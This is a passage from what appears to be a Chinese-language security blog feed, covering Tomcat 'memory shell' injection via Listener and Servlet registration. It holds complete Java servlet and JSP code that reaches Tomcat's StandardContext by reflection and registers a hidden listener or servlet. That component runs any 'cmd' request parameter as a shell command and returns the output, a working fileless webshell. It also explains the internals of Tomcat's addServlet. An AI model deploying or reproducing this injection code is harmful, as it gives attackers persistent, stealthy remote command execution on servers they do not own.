class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.RequestFacade;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;ListenerMemoryShellServlet&quot;, value = &quot;/ListenerMemoryShellServlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ListenerMemoryShellServlet</span> <span class="keyword">extends</span> <span class="title class_">HelloServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doGet(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) context.get(servletContext);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">context1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            context1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) context1.get(applicationContext);</span><br><span class="line"></span><br><span class="line">            <span class="type">ServletRequestListener</span> <span class="variable">listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletRequestListener</span>() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">                    <span class="type">RequestFacade</span> <span class="variable">requestFacade</span> <span class="operator">=</span> (RequestFacade) sre.getServletRequest();</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                        <span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> RequestFacade.class.getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                        requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                        <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request) requestField.get(requestFacade);</span><br><span class="line">                        <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> request.getResponse();</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                            <span class="type">String</span> <span class="variable">osType</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                            <span class="keyword">if</span> (osType != <span class="literal">null</span> &amp;&amp; osType.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                                isLinux = <span class="literal">false</span>;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            String[] command = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">                            <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(command).getInputStream();</span><br><span class="line">                            <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(inputStream).useDelimiter(<span class="string">&quot;h3rmesk1t&quot;</span>);</span><br><span class="line">                            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> scanner.hasNext() ? scanner.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                            response.getWriter().write(output);</span><br><span class="line">                            response.getWriter().flush();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            standardContext.addApplicationEventListener(listener);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/Tomcat-Listener/11.png"></p><h3 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h3><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.RequestFacade&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) context.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">context1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    context1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) context1.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">ServletRequestListener</span> <span class="variable">listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServletRequestListener</span>() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="type">RequestFacade</span> <span class="variable">requestFacade</span> <span class="operator">=</span> (RequestFacade) sre.getServletRequest();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                <span class="type">Field</span> <span class="variable">requestField</span> <span class="operator">=</span> RequestFacade.class.getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                requestField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request) requestField.get(requestFacade);</span><br><span class="line">                <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> request.getResponse();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osType</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osType != <span class="literal">null</span> &amp;&amp; osType.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        isLinux = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    String[] command = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, cmd&#125;;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(command).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(inputStream).useDelimiter(<span class="string">&quot;h3rmesk1t&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> scanner.hasNext() ? scanner.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    response.getWriter().write(output);</span><br><span class="line">                    response.getWriter().flush();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    standardContext.addApplicationEventListener(listener);</span><br><span class="line">    response.getWriter().write(<span class="string">&quot;Listener Inject Successfully...&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="/2024/05/18/Tomcat-Listener/12.png"></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MemoryShell </tag>
            
            <tag> Tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat MemoryShell Of Servlet</title>
      <link href="/2024/05/18/Tomcat-Servlet/"/>
      <url>/2024/05/18/Tomcat-Servlet/</url>
      
        <content type="html"><![CDATA[<h2 id="Preparation"><a href="#Preparation" class="headerlink" title="Preparation"></a>Preparation</h2><p>在Tomcat架构中，Servlet的生命周期分为五个部分：</p><ul><li>加载阶段：当Tomcat第一次访问Servlet时，会创建Servlet的实例。</li><li>初始化阶段：当Servlet实例化后，Tomcat会调用init方法初始化这个对象。</li><li>处理服务阶段：当浏览器访问Servlet时，Servlet会调用service方法处理请求。</li><li>销毁阶段：当Tomcat关闭时或者检测到Servlet要从Tomcat删除时，会自动调用destroy方法，让该实例释放掉所占的资源。除此之外，一个Servlet如果长时间不被使用的话，也会被Tomcat自动销毁。</li><li>卸载阶段：当Servlet调用完destroy方法后，会等待垃圾回收。如果有需要再次使用这个Servlet时，会重新调用init方法进行初始化操作。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Servlet</span> &#123;</span><br><span class="line"><span class="comment">// 由servlet容器调用，向servlet表明该servlet正在被投入服务。</span></span><br><span class="line"><span class="comment">// 在实例化servlet之后，servlet容器正好调用init方法一次。在servlet可以接收任何请求之前，init方法必须成功完成。</span></span><br><span class="line"><span class="comment">// 如果init方法出现以下情况，servlet容器就不能将servlet放入服务中</span></span><br><span class="line"><span class="comment">// 抛出一个ServletException</span></span><br><span class="line"><span class="comment">// 在Web服务器定义的时间段内没有返回</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig config)</span> <span class="keyword">throws</span> ServletException;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回一个ServletConfig对象，其中包含该Servlet的初始化和启动参数。返回的ServletConfig对象是传递给init方法的对象。</span></span><br><span class="line"><span class="comment">// 这个接口的实现负责存储ServletConfig对象，以便这个方法能够返回它。实现这个接口的GenericServlet类已经做到了这一点。</span></span><br><span class="line"><span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span>;  </span><br><span class="line"></span><br><span class="line"><span class="comment">// 由servlet容器调用，允许servlet对请求作出响应。</span></span><br><span class="line"><span class="comment">// 这个方法只有在servlet的init()方法成功完成后才会被调用。</span></span><br><span class="line"><span class="comment">// 对于抛出或发送错误的servlet，响应的状态代码总是应该被设置。</span></span><br><span class="line"><span class="comment">// Servlet通常在多线程的Servlet容器内运行，可以同时处理多个请求。开发人员必须注意同步访问任何共享资源，如文件、网络连接和以及servlet的类和实例变量。关于Java中多线程编程的更多信息，可以在Java多线程编程教程中找到。</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest req, ServletResponse res)</span> <span class="keyword">throws</span> ServletException, IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回有关Servlet的信息，如作者、版本和版权。</span></span><br><span class="line"><span class="comment">// 该方法返回的字符串应该是纯文本，而不是任何形式的标记（如HTML、XML等）。</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 由servlet容器调用，向servlet表明该servlet将被退出服务。只有在servlet的服务方法中的所有线程都退出后，或者在超时期过后，才会调用这个方法。在servlet容器调用该方法后，它将不再调用该servlet的服务方法。</span></span><br><span class="line">    <span class="comment">// 这个方法给了servlet一个机会来清理任何被保留的资源（例如，内存、文件句柄、线程），并确保任何持久化状态与servlet在内存中的当前状态同步。</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Process-Analysis"><a href="#Process-Analysis" class="headerlink" title="Process Analysis"></a>Process Analysis</h2><p>与Filter内存马类似，在javax.servlet.ServletContext中同样存在着addServlet和createServlet方法。</p><p><img src="/2024/05/18/Tomcat-Servlet/1.png"></p><p>跟进addServlet的实现方法org.apache.catalina.core.ApplicationContext#addServlet，在该方法中，先对传入的servletName进行检测，为空时会抛出异常。接着判断context的生命周期，如果处于LifecycleState.STARTING_PREP状态，同样会抛出异常。接着通过servletName从context中寻找相关联的子容器，并将其转换成Wrapper对象，当不存在时，会创建一个名字为servletName的wrapper，再将创建的wrapper添加到context的子容器中。最后判断servlet是否为null，当servlet &#x3D;&#x3D; null时，会将传入的servletClass设置进wrapper中。最后调用org.apache.catalina.core.StandardContext#dynamicServletAdded方法进行servlet动态加载。</p><p><img src="/2024/05/18/Tomcat-Servlet/2.png"></p><p>跟进org.apache.catalina.core.StandardContext#dynamicServletAdded方法，实例化一个ApplicationServletRegistration对象。</p><p><img src="/2024/05/18/Tomcat-Servlet/3.png"></p><p><img src="/2024/05/18/Tomcat-Servlet/4.png"></p><p>在org.apache.catalina.core.StandardContext#startInternal方法中，注意到servlet构造时调用的loadOnStartup方法中，会获取loadOnStartup的值，此时只有loadOnStartup的值大于0才会进行wrapper的加载。</p><p><img src="/2024/05/18/Tomcat-Servlet/5.png"></p><h2 id="Achievement"><a href="#Achievement" class="headerlink" title="Achievement"></a>Achievement</h2><h3 id="Idea"><a href="#Idea" class="headerlink" title="Idea"></a>Idea</h3><p>动态注入Servlet内存马的具体思路如下:</p><ol><li>调用StandardContext.createWrapper为servlet创建wrapper；</li><li>配置LoadOnStartup启动优先级；</li><li>配置ServletName；</li><li>配置ServletClass；</li><li>addChild添加wrapper到Context；</li><li>addServletMapping添加映射。</li></ol><h3 id="Dynamic-Registration"><a href="#Dynamic-Registration" class="headerlink" title="Dynamic Registration"></a>Dynamic Registration</h3><h4 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> servlet;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Wrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;ServletMemoryShellServlet&quot;, value = &quot;/ServletMemoryShellServlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletMemoryShellServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">super</span>.doGet(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) context.get(servletContext);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">context1</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            context1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) context1.get(applicationContext);</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">servletMapping</span> <span class="operator">=</span> standardContext.findServletMapping(<span class="string">&quot;servletMemoryShell&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (servletMapping != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> standardContext.createWrapper();</span><br><span class="line">            wrapper.setName(<span class="string">&quot;servletMemoryShell&quot;</span>);</span><br><span class="line">            <span class="type">Servlet</span> <span class="variable">servletMemoryShell</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Servlet</span>() &#123;</span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(ServletConfig servletConfig)</span> &#123;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">public</span> ServletConfig <span class="title function_">getServletConfig</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">service</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                    <span class="type">HttpServletRequest</span> <span class="variable">httpServletRequest</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">                    <span class="type">HttpServletResponse</span> <span class="variable">httpServletResponse</span> <span class="operator">=</span> (HttpServletResponse) servletResponse;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (httpServletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">osType</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                        <span class="keyword">if</span> (osType != <span class="literal">null</span> &amp;&amp; osType.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                            isLinux = <span class="literal">false</span>;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        String[] command = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, httpServletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, httpServletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                        <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(command).getInputStream();</span><br><span class="line">                        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(inputStream).useDelimiter(<span class="string">&quot;h3rmesk1t&quot;</span>);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> scanner.hasNext() ? scanner.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                        httpServletResponse.getWriter().write(output);</span><br><span class="line">                        httpServletResponse.getWriter().flush();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">public</span> String <span class="title function_">getServletInfo</span><span class="params">()</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            wrapper.setLoadOnStartup(<span 